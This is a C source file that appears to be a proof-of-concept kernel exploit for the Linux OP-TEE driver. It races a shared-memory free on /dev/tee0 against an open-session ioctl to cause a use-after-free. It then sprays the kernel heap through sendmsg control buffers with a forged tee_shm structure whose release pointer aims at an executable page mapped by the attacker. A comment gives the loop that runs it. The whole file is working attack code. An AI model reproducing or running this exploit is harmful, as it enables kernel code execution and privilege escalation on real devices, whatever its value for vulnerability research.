#define _GNU_SOURCE

#include "misc.h"

#ifndef __NR_ioctl
#define __NR_ioctl 54
#endif
#ifndef __NR_mmap
#define __NR_mmap 192
#endif
#ifndef __NR_openat
#define __NR_openat 322
#endif
#undef __NR_mmap
#define __NR_mmap __NR_mmap2


#define CPU0  0
#define CPU1  1
#define FREE_THREADS 50
#define REALLOC_THREADS 20
#define REALLOC_BUF_SIZE 64

pthread_t frees[FREE_THREADS];
pthread_t setup_thr, uaf_thr;

struct realloc_thread_arg
{
  pthread_t tid;
  int recv_fd;
  int send_fd;
  struct sockaddr_un addr;
};

struct realloc_thread_arg rta[REALLOC_THREADS];

pthread_cond_t cond;
pthread_mutex_t lock;

struct file *f;
struct dma_buf *db;
struct tee_shm ts;
struct path p;
struct rcu_head rh;
struct dma_buf_ops *dbo;
struct dentry *d;
atomic_long_t a64;
struct dentry_operations dops;

int fd_to_close;
int syscall_fd;
static volatile size_t g_trigger_now;


void sleep_ms(uint64_t ms)
{
  usleep(ms * 1000);
}


int pin_cpu(int core, pthread_t thr_id)
{
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(core, &cpuset);
  return pthread_setaffinity_np(thr_id, sizeof(cpuset), &cpuset);
}


int set_prio(int policy, int prio)
{
  struct sched_param param;
  param.sched_priority = prio;

  return pthread_setschedparam(pthread_self(), policy, &param);
}


void rh_func(struct callback_head *head) 
{
  return;
}

void init_fake_structs()
{
  d = (struct dentry *) malloc(sizeof (struct dentry));
  memset(d->buf, 0x41, 1024); 

  a64.counter = 1;
  p.mnt = 0x0;
  p.dentry = NULL;

  rh.next = NULL;
  rh.func = &rh_func;

  super_block.s_flags = 0;

  inode.i_size = 4096;
  inode.i_sb = &super_block;
  inode.inotify_watches.next = &inode.inotify_watches;
  inode.inotify_watches.prev = &inode.inotify_watches;
  inode.inotify_mutex.count = 1;  

 
  f = (struct file *) malloc(sizeof (struct file));
  f->f_op = (struct file_operations *) malloc(sizeof (struct file_operations));
  f->f_op->release = 0x22000000;
  f->f_op->fasync = 0x22000000;
  f->f_u.fu_rcuhead = rh;
  f->f_lock = 12;
  f->f_write_hint = 14;
  f->f_path = p;
  f->f_inode = &inode;
  f->f_count = a64;
  f->f_flags = (fmode_t) 0x4080000; 
  f->f_mode = (fmode_t) 0x4080000;
  memset(f->buf, 0x00, 1024);  

  db = (struct dma_buf *) malloc(sizeof (struct dma_buf));
  dbo = (struct dma_buf_ops *) malloc(sizeof (struct dma_buf_ops));
  dbo->release = 0x42424242;
  db->size = 0x111;
  db->ops = dbo;
  db->file = f;
  memset(db->buf, 0x1, 1024);  

  ts.ctx = 0x1;
  ts.paddr = 123;
  ts.size = 4096;
  ts.offset = 12;
  ts.pages = 0x1;
  ts.num_pages = 100;
  ts.dmabuf = db;
  ts.flags = 255;
  ts.id = 31337;

  void *tmp = mmap((void *) 0x22000000, 0x1000, PROT_WRITE|PROT_READ|PROT_EXEC, 
                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
  if (tmp == -1) {
    perror("mmap failed");
    return -1;
  }  
}


int prepare_blocking_socket(struct realloc_thread_arg * rta)
{
  static int sock_counter;

  char buf[200]; // should be less than (sk->sk_sndbuf - 32), you can use getsockopt()
  int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF
  struct sockaddr_un addr;
  struct timeval tv;

  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf)
  };

  struct msghdr msg = {
    .msg_name = &addr,
    .msg_namelen = sizeof(addr),
    .msg_iov = &iov,
    .msg_iovlen = 1,
    .msg_control = NULL,
    .msg_controllen = 0,
    .msg_flags = 0, 
  };

  if ((rta->send_fd = socket(AF_UNIX, SOCK_DGRAM, 0)) < 0 ||
      (rta->recv_fd = socket(AF_UNIX, SOCK_DGRAM, 0)) < 0)
  {
    goto fail;
  }
  memset(&tv, 0, sizeof(tv));
  memset((void *) &addr, 0, sizeof(addr));
  addr.sun_family = AF_UNIX;
  sprintf(addr.sun_path + 1, "sock_%d_1_%d", gettid(), ++sock_counter);  
  
  while (bind(rta->recv_fd, (struct sockaddr*)&addr, sizeof(addr)))
  {
    if (errno != EADDRINUSE)
    {
      goto fail;
    }
  }

  if (connect(rta->send_fd, (struct sockaddr*)&addr, sizeof(addr)))
  {
    goto fail;
  }

  setsockopt(rta->send_fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
  setsockopt(rta->recv_fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
  
  while (sendmsg(rta->send_fd, &msg, MSG_DONTWAIT) > 0)  // <----- don't forget MSG_DONTWAIT
    ;
  if (errno != EAGAIN)  // <----- did we failed because the receive buffer is full ?
  {
    goto fail;
  }

  rta->addr = addr;

  return 0;

fail:
  return -1;
}


void* realloc_thread(void *arg) 
{
  set_prio(SCHED_OTHER, 0);
  pin_cpu(CPU1, pthread_self());
  struct realloc_thread_arg *rta = (struct realloc_thread_arg*) arg;

  char fake_struct[REALLOC_BUF_SIZE];
  memcpy(fake_struct, (void*) &ts, sizeof(struct tee_shm));
  struct msghdr mhdr;
  char buf[200];

  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf),
  };
  mhdr.msg_iov = &iov;
  mhdr.msg_iovlen = 1;

  prepare_blocking_socket(rta);
  struct cmsghdr *first;

  // necessary to pass checks in __scm_send()
  first = (struct cmsghdr*) fake_struct;
  first->cmsg_len = sizeof(fake_struct);
  first->cmsg_level = 0; // must be different than SOL_SOCKET=1 to "skip" cmsg
  first->cmsg_type = 1; // arbitrary value

  /* This is the data that will overwrite the vulnerable object in the heap */
  mhdr.msg_control = fake_struct;

  /* This is the user controlled size, eventually kmalloc(msg_controllen) will occur */
  mhdr.msg_controllen = REALLOC_BUF_SIZE;

  pthread_mutex_lock(&lock);
  pthread_cond_wait(&cond, &lock);
  pthread_mutex_unlock(&lock);

  sendmsg(rta->send_fd, &mhdr, 0);
}


void init_realloc_threads()
{
  pthread_cond_init(&cond, NULL);
  pthread_mutex_init(&lock, NULL);   

  memset(rta, 0, sizeof(rta));

  pthread_attr_t attr;
  pthread_attr_init(&attr);
  pthread_attr_setstacksize(&attr, 128 << 10);
  for (int t=0; t < REALLOC_THREADS; t++) {
    pthread_create(&rta[t].tid, &attr, realloc_thread, &rta[t]);   
    pthread_attr_destroy(&attr);
  }
}


void destroy_realloc_threads() {
  for (int t = 0; t < REALLOC_THREADS; t++) {
    close(rta[t].send_fd);
    close(rta[t].recv_fd);
    //pthread_cancel(&rta[t]);
  }
}


void* uafThrFun(void *arg)
{
  set_prio(SCHED_IDLE, 0);
  pin_cpu(CPU1, pthread_self());

  *(uint64_t*)0x200001c0 = 0x20000100;
  memcpy(
      (void*)0x20000100,
      "\x3d\x79\x23\xa4\x1c\x10\x17\x6c\x23\x63\x79\x02\x62\xbc\x0d\x0a",
      16);
  memcpy(
      (void*)0x20000110,
      "\xee\x6d\x51\x6b\x61\xc4\x9e\xde\xa9\x2e\xbb\xaa\xa0\xd4\x1e\x82",
      16);
  *(uint32_t*)0x20000120 = 0;
  *(uint32_t*)0x20000124 = 0;
  *(uint32_t*)0x20000134 = 1;
  *(uint64_t*)0x20000138 = 6;
  *(uint64_t*)0x20000140 = 0;
  *(uint64_t*)0x20000148 = 0;
  *(uint64_t*)0x20000150 = 1;
  *(uint64_t*)0x200001c8 = 0x58;

  while (!g_trigger_now) ;

  syscall(__NR_ioctl, syscall_fd, 0x8010a402, 0x200001c0); // open session
}


void* setup(void *arg)
{
  set_prio(SCHED_IDLE, 0);
  pin_cpu(CPU1, pthread_self());


  memcpy((void*)0x20000040, "/dev/tee0\000", 10);
  syscall_fd = syscall(__NR_openat, 0xffffff9c, 0x20000040, 0, 0); // open /dev/tee0
  *(uint64_t*)0x20000080 = 0x48;
  *(uint32_t*)0x20000088 = 0;
  fd_to_close = syscall(__NR_ioctl, syscall_fd, 0xc010a401, 0x20000080); // shm alloc
}


void* free_thr(void *arg)
{
  set_prio(SCHED_OTHER, 0);
  pin_cpu(CPU0, pthread_self());

  int id = (int)(intptr_t) arg;
  g_trigger_now = 1;

  close(fd_to_close);
  if (id == 5)
    pthread_cond_broadcast(&cond);

  sleep_ms(100);  
}

// Run with:
// dmesg -n 1
// until optee_example_hello_world | grep "0x22000000" /var/log/messages; do sleep 0.01; done
int main()
{
  set_prio(SCHED_OTHER, 0);
  pin_cpu(CPU0, pthread_self());  
  
  init_fake_structs();  

  syscall(__NR_mmap, 0x1ffff000, 0x1000, 0, 0x32, -1, 0);
  syscall(__NR_mmap, 0x20000000, 0x1000000, 7, 0x32, -1, 0);
  syscall(__NR_mmap, 0x21000000, 0x1000, 0, 0x32, -1, 0); 

  for (int j = 0; j < 30; j++) {
    init_realloc_threads();

    g_trigger_now = 0;

    pthread_create(&setup_thr, NULL, setup, NULL);
    pthread_join(setup_thr, NULL);

    pthread_create(&uaf_thr, NULL, uafThrFun, NULL);

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 128 << 10);
    for (int i = 0; i < FREE_THREADS; i++) {
      void *arg = (void*)(intptr_t)(i+1);
      pthread_create(&frees[i], &attr, free_thr, arg);
      pthread_attr_destroy(&attr);
    }
    close(syscall_fd);
  }
  return 0;
}
